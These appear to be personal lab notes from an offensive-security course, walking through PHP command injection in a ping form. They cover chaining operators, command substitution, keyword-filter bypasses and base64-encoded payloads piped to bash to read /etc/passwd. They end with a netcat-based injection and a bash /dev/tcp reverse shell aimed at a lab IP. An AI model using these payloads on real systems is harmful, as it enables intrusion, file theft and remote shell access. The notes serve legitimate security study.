#### Command Chaining
`ci-sandbox` starting page
![[Pasted image 20250120225335.png]]once hitting on the `php command injection` this is the page
![[Pasted image 20250120225415.png]]
what pops up in `BURP`
- we can assume it is using the `ip` GET argument to initiate the ping command
![[Pasted image 20250120225433.png]]
because the `TTL` is `64` we know that it is running linux - this is important so we can narrow down what kind of command injection we can do 
- linux and windows commands are completely different
![[Pasted image 20250120230226.png]]
by the file name running we know that it is `php`
![[Pasted image 20250120230354.png]]
this allows us to atleast imagine what the back end source looks like because we know its `php`
![[Pasted image 20250120230516.png]]
lets focus on the `system` line, in this example we want to inject our commands after `PING` - we need to find a way to add a command after ping. this can be exploited by using `command chaining`
![[Pasted image 20250120230700.png]]
the first way to execute command chaining is by using a `;` this will execute the ping command first, then whatever comes after the `;`
```php
ping -c 5 127.0.0.1;id
```
you can also chain multiple commands together like this 
```php
ping -c 5 127.0.0.1;id;whoami
```
here we can see the `three` commands
![[Pasted image 20250120231031.png]]
another way is by using a `pipe` `|` - in shells a pipe allows the output of the first command to be used as input for the next 
- there are caveats to using `pipe`
if we use 
```php
ping -c 5 127.0.0.1 | id
```
it only shows the `id` command because the output of ping got fed into `id` which ate it essentially because `id` is a bash command and doesn't care about standard input or output
- be aware of this, the `|` output may not be visible
![[Pasted image 20250120231500.png]]
another way is by using `&&` which executes the second command `IF` the first command successfully executes - in this example `ls` executes therefore so does `id`
![[Pasted image 20250120231811.png]]
`HOWEVER` if we execute `&&` in the browser it will not execute because `&` is used in `URL's` as a delimeter meaning it separates `GET` parameters
![[Pasted image 20250120232027.png]]
the `BROWSER` typically `URL_encodes` this type of stuff but with `&&` it doesn't as seen here so it will fail adn not execute the `id` portion
![[Pasted image 20250120233715.png]]
but `URL encoding` the `&&`  to `%26%26`  will allow it to work
![[Pasted image 20250120233820.png]]OR
we can also use the `OR` operator `||` which is double pipes, the second portion of the command only executes if the `1st` portion fails
- in this example `id` never executes because `whoami` executes
![[Pasted image 20250121165428.png]]
if the first command fails then the `2nd` will execute
![[Pasted image 20250121165510.png]]
a way we could get this to execute is by changing the `ping` IP address to `127.0.0.` which is invalid there fore will execute the `id` instead
![[Pasted image 20250121171750.png]]

#### Command Substitution

here `whoami` will execute which is = to `kali` then the output with substitute the entire text
![[Pasted image 20250121172309.png]]
so now because the `output` is equal to `kali` the command line tried executing `kali`
![[Pasted image 20250121172357.png]]
another example of this is 
```
echo "I am `whoami`"
```
and the `whoami` results is `=` kali so is replaced
![[Pasted image 20250121172529.png]]
can use `id $(whoami)` to get the `id` information of `kali` because thats what gets returned from `whoami`
![[Pasted image 20250121183206.png]]
can also set variables this way 
- one characteristic of Command Substitution is that  it will always execute first but the original command needs the output before it is able to proceed.
![[Pasted image 20250121183329.png]]
However we do not always need the first command to properly execute in order for the second command to run.
- here we still get the results of `id` even though ping failed because the output of `id` will be use as an argument to `ping`
![[Pasted image 20250121184727.png]]
so looking at this in `burp` `id` executes but we dont see the results, but sometimes we dont care about seeing the results as long as it executes
![[Pasted image 20250121184948.png]]

***Command Substitution will always execute first***

now if we change the command to `ip=127.0.0.1$(nc+192.168.49.89+4444)` and make sure that it is encoded we can get command execution
![[Pasted image 20250121185426.png]]

Continuing on after [[13.1.4 About the Chaining of Commands & System Calls]]

#### Bypass Input Filtering / Input Sanitization
trying `;whoami`
![[Pasted image 20250121222916.png]]
the first question to ask is does it only affect ip addresses? And we need to test to see what works and what doesn't - trial and error to understand what kind of filtering is taking palce
- first lets remove `whoami` and leave the `;`
![[Pasted image 20250122210302.png]]
it works so this tells us the type of  filtering taking place is `keyboard filtering`
- we can try bruteforcing commands with `wfuzz`, lets try `cat` which is filtered
![[Pasted image 20250122210403.png]]
`;ps` is not filtered
![[Pasted image 20250122210440.png]]
a way to bypass simple string test is with a `now` string
with `whoami` we can do something like this - `$()` doesnt execute anything but `who$()ami` does
![[Pasted image 20250122211725.png]]
now which one will correctly bypass?
- the `id` will most likely fale because it is looking for `id`
```bash
$()id
who``ami
whoam$(i)
```
the second one works
![[Pasted image 20250122214054.png]]
the last one fails because `i` is inside the command substitution
![[Pasted image 20250122214124.png]]
however `echo` is allowed so we can make this work
![[Pasted image 20250122214233.png]]
making `whoam$(echo+i)` - making sure that it is encoded
![[Pasted image 20250122214336.png]]
an additional way is by `encoding` our payload and then `decoding` the payload with `base64` which is a good encoding when sending stuff over the web

```bash
echo "cat /etc/passwd" | base64
```
![[Pasted image 20250122214947.png]]
once it reaches the target then we wat to decode it with
```bash
echo "base64string here" | base64 -d
```
this printed the `payload` but it did not execute it
![[Pasted image 20250122215048.png]]
this payload executes it
```bash
echo "Y2F0IC9ldGMvcGFzc3dkCg==" | base64 -d | bash   
```
![[Pasted image 20250122215424.png]]
as well as - wasnt testing
```bash
$(echo "Y2F0IC9ldGMvcGFzc3dkCg==" | base64 -d | bash)
```
we can see that the original base64 payload works as long as we url encode it in burp properly
![[Pasted image 20250122215604.png]]- two methods 
#### [[13.2.2 Blocklisted Strings Bypass]] exercise done here

```bash
# all out put will go through the /dev/tcp socket and all input will be input to the socket
bash -i >& /dev/tcp/192.168.49.150/4444 0>&1
```
if this is ran with a `nc` listener it will be unable to execute, this is because the shell running is `zsh` shell
![[Pasted image 20250217090117.png]]
to get this to run we have to ensure that it is running with `bash`
![[Pasted image 20250217090208.png]]
caught shell, good to remember that not all machines run bash by default
![[Pasted image 20250217090221.png]]